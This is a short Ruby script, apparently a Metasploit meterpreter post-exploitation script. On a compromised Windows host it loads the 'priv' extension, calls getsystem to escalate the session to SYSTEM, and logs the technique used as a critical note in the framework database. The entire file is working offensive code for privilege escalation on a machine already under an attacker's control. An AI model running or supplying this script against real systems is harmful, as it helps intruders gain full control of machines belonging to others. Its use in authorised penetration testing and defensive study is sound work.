##
# $Id$
##

if (client.sys.config.sysinfo["OS"].downcase =~ /win/)
	if (client.sys.config.getuid !~ /SYSTEM/)
		#
		# Escalate to SYSTEM
		#
		begin
			client.core.use("priv")
			result = client.priv.getsystem( 0 )
			print_status "Reporting note..."
			client.framework.db.report_note(
				:host => client.sock.peerhost,
				:workspace => self.workspace,
				:type => "meterpreter.getsystem",
				:data => {:technique => result[1]},
				:critical => true,
				:update => :insert
			)
			print_status("Escalate using getsystem returned #{result.inspect}")
			result
		rescue
			#Java meterpreter will try to read ext_server_priv.jar
			#In that case this will catch it
			return
		end
	end
else
	print_error("No priv escalation for non-windows systems")
end

